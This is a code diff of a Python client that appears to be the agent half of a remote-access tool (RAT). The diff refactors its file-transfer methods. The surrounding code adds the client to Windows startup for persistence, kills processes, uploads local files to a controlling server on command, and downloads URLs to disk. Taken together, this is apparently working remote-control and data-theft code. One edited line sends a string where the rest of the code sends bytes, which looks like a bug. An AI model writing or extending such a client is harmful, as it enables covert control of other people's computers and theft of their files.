@@ -52,17 +52,6 @@ logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(mes
 logging.info('Client Started.')
 
 
-def read_file(path: str, block_size: int = 32768) -> bytes:
-    """ Generator for reading files """
-    with open(path, 'rb') as _file:
-        while True:
-            piece = _file.read(block_size)
-            if piece:
-                yield piece
-            else:
-                return
-
-
 def reverse_readline(filename: str, buf_size: int = 16384) -> str:
     """A generator that returns the lines of a file in reverse order"""
 
@@ -127,7 +116,6 @@ def add_startup() -> list:
     except Exception as error:
         return errors(error)
     logging.info('Added Client to Startup')
-    return None
 
 
 def remove_startup() -> list:
@@ -147,7 +135,6 @@ def remove_startup() -> list:
     except WindowsError as error:
         return errors(error)
     logging.info('Removed Client from Startup')
-    return None
 
 
 def kill(pid: int) -> None:
@@ -229,45 +216,50 @@ class Client(object):
         """ Send JSON data to Server """
         self.send(json.dumps(data).encode())
 
-    def check_perms(self, _file: str, mode: str) -> bool:
-        """ Check permissions to a file """
+    def send_file(self, file_to_transfer: str, block_size: int = 32768) -> None:
+        """ Send file to Server """
+        # returns None
         try:
-            with open(_file, mode):
-                pass
-        except Exception as error:
+            with open(file_to_transfer, 'rb') as file:
+                while True:
+                    block = file.read(block_size)
+                    if not block:
+                        break
+                    self.send(block)
+                    self.receive()
+
+        except (FileNotFoundError, PermissionError) as error:
             self.send(b'FILE_TRANSFER_ERROR')
             self.receive()
             self.send(errors(error).encode())
-            return False
-        return True
-
-    def send_file(self, file_to_transfer: str) -> None:
-        """ Send file to Server """
-        # returns None
-        if not self.check_perms(file_to_transfer, 'rb'):
+            logging.error('Error transferring %s to Server: %s' % (file_to_transfer, errors(error)))
             return
-        for block in read_file(file_to_transfer):
-            self.send(block)
-            self.receive()
+
         self.send(b'FILE_TRANSFER_DONE')
-        self.receive()
-        self.send(b'File Transferred Successfully')
         logging.info('Transferred %s to Server', file_to_transfer)
 
     def receive_file(self, save_as: str) -> None:
         """ Receive File from Server"""
         # returns None
-        if not self.check_perms(save_as, 'wb'):
+
+        try:
+            with open(save_as, 'wb') as file:
+                self.send('Successfully opened file')
+                while 1:
+                    data = self.receive()
+                    if data == b'FILE_TRANSFER_DONE':
+                        break
+                    file.write(data)
+                    self.send(b'RECEIVED')
+
+        except (FileNotFoundError, PermissionError) as error:
+            self.send(b'FILE_TRANSFER_ERROR')
+            self.receive()
+            self.send(errors(error).encode())
+            logging.error('Error receiving %s from Server: %s' % (save_as, errors(error)))
             return
-        self.send(b'RECEIVED')
-        with open(save_as, 'wb') as _file:
-            while 1:
-                data = self.receive()
-                if data == b'FILE_TRANSFER_DONE':
-                    self.send(b'File Transferred Successfully')
-                    break
-                _file.write(data)
-                self.send(b'RECEIVED')
+
+        self.send(b'File transferred Successfully')
         logging.info('Transferred %s to Client', save_as)
 
     def receive_commands(self) -> None:
@@ -398,8 +390,8 @@ class Client(object):
                 logging.info('Downloading "%s" from %s', data[2], data[1])
                 try:
                     request = requests.get(data[1])
-                    with open(data[2], 'wb') as _file:
-                        _file.write(request.content)
+                    with open(data[2], 'wb') as file:
+                        file.write(request.content)
                 except Exception as err:
                     self.send_json(errors(err, line=False))
                     continue
